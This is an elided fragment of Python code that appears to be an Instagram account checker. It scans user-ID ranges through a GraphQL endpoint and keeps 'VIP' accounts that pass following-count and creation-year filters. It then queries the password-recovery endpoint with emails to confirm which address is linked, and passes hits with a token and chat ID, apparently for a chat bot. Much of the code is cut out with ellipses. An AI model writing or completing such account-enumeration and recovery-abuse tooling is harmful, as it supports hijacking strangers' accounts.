...
CONFIG = {
    ...
    "id_ranges": [
        ...
        (63313426938, 70313426938, 2024),
        (70313426938, 78313426938, 2025)
    ]
}
hits = 0
bad_insta = 0
...
def save_hit(username, domain, user, token, chat_id):
    ...
    if VIP_CONFIG["vip_min_following"]:
        if user.get("following_count", 0) < VIP_CONFIG["vip_min_following"]:
            return

    user_year = gdate(user_id)
    if VIP_CONFIG["vip_date_min"]:
        if user_year < VIP_CONFIG["vip_date_min"]:
            return

    if VIP_CONFIG["vip_date_maks"]:
        if user_year > VIP_CONFIG["vip_date_maks"]:
            return
...
def cinstagram(email, token, chat_id, user):
    ...
    try:
        ...
        resp = global_session.post(CONFIG["insta_recovery"], headers=headers, data=data, timeout=5).text
        if email in resp:
            good_insta += 1
...
def sinsta(min_id, max_id):
    ...
    while True:
        try:
            ...
            resp = session.post(CONFIG["insta_graphql"], headers=headers, data=data, cookies=cookies, timeout=1)
